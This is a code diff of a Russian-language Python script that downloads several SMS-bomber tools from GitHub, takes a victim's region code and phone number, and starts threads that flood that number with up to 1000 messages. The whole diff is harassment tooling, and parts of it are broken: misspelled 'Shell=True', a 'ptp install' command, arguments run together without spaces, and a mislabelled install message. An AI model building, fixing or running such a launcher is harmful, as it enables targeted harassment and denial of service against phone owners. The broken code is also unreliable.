@@ -4,7 +4,6 @@ import getpass
 import sys
 from threading import Thread
 import time
-import keyboard
 from colorama import Fore, Back
 
 clearmode = '0'
@@ -15,25 +14,30 @@ if sys.platform == 'Linux':
     clearmode = 'clear'
 
 checkImpulse = False
-check300 = False
+checkB3 = False
+checkYASB = False
 def Download():
     time.sleep(5)
     os.mkdir(UP)
     os.chdir(UP)
     print('  \nЗагрузка бомберов...')
-    subprocess.call('pip install tbomb', shell=True)
-    print('Установлен tbomb')
+    if checkYASB == False:
+        subprocess.call(f'git clone https://github.com/AvinashReddy3108/YetAnotherSMSBomber', shell=True)
+        print('Установлен YASB(YetAnotherSMSBomber)')
+        os.chdir(UP + 'YetAnotherSMSBomber')
+        subprocess.call(f'ptp install -r requirements.txt')
+        os.chdir(UP)
     if checkImpulse == False:
         subprocess.call(f'git clone https://github.com/LimerBoy/Impulse', shell=True)
         os.chdir(UP + 'Impulse')
         subprocess.call(f'pip install -r requirements.txt', shell=True)
         print('Установлен Impulse')
         os.chdir(UP)
-    if check300 == False:
-        subprocess.call(f'git clone https://github.com/Ivan-Hacker-700/SMS-Bomber-300-Free', shell=True)
-        os.chdir(UP + 'SMS-Bomber-300-Free')
+    if checkB3 == False:
+        subprocess.call(f'git clone https://github.com/iMro0t/bomb3r.git', Shell=True)
+        os.chdir(UP + 'bomb3r')
         subprocess.call(f'pip install -r requirements.txt', shell=True)
-        print('Установлен SMS-Bomder-300-Free')
+        print('Установлен Impulse')
         os.chdir(UP)
 
  #Функция экрана ввода номера телефона 
@@ -41,8 +45,8 @@ def main():
     os.chdir(UP)
     print('ver 0.1\n')
     #стоит создать переменные кода региона, номер без региона и полный номер(разные бомберы юзают разный формат ввода номера)
-    RC = input(Fore.BLACK + Back.GREEN + 'Введите код Региона без +() -->' + Back.RESET + Fore.RESET)
-    num = input(Fore.BLACK + Back.GREEN + 'Введите номер() -->' + Back.RESET + Fore.RESET)
+    RC = str(input(Fore.BLACK + Back.GREEN + 'Введите код Региона без +() -->' + Back.RESET + Fore.RESET))
+    num = str(input(Fore.BLACK + Back.GREEN + 'Введите номер() -->' + Back.RESET + Fore.RESET))
 
 def logo():
     os.system(clearmode)
@@ -101,25 +105,17 @@ if os.path.isdir(UP):
         print(Back.YELLOW + 'твы. Ведь изначально этот скрипт  создавался в  качестве шутки...' + Back.RESET)
         print(Back.YELLOW + 'Я надеюсь ты понимаешь, что сейчас делаешь.' + Back.RESET + Fore.RESET)
 
-        def tbomb():
-            #Функция запуска tbomb
-            subprocess.call(f'tbomb -sms', shell=True)
-            subprocess.call(RC, Shell=True)
-            subprocess.call(num, Shell=True)
-            subprocess.call(f'100', Shell=True)
-            subprocess.call(f'2', Shell=True)
-            subprocess.call(f'100', Shell=True)
-            keyboard.press('Enter')
-        tbombTh = Thread(target=tbomb)
-        tbombTh.start()
-        def sms300():
-            os.chdir(UP + 'SMS-Bomber-300-Free')
-            subprocess.call(f'python SMSBomber300', Shell=True)
-            subprocess.call(f'1', Shell=True)
-            subprocess.call(f'1', Shell=True)
-            subprocess.call(f'+' + fullnum, Shell=True)
-        sms300Th = Thread(target=sms300)
-        sms300Th.start()
+        def YASB():
+            os.chdir(UP + 'YetAnotherSMSBomber')
+            subprocess.call(f'python bomber.py -N 1000 -C ' + RC + '-T 15 -t 10' + num, Shell=True)
+        YASBTh = Thread(target=YASB)
+        YASBTh.start()
+        def B3():
+            os.chdir(UP + 'bomb3r')
+            subprocess.call(f'python bomber.py -S -C ' + RC + '-T 15 ' + num, Shell=True)
+        B3Th = Thread(target=B3)
+        B3Th.start()
+
 
 
 
@@ -140,8 +136,6 @@ else:
 
 
 #ссылки на бомберы
-    # subprocess.call(f'', shell=True)
-    # https://github.com/yyasha/smsbomb
     # https://github.com/K1ngSoul/Parad1seBomb
 
 
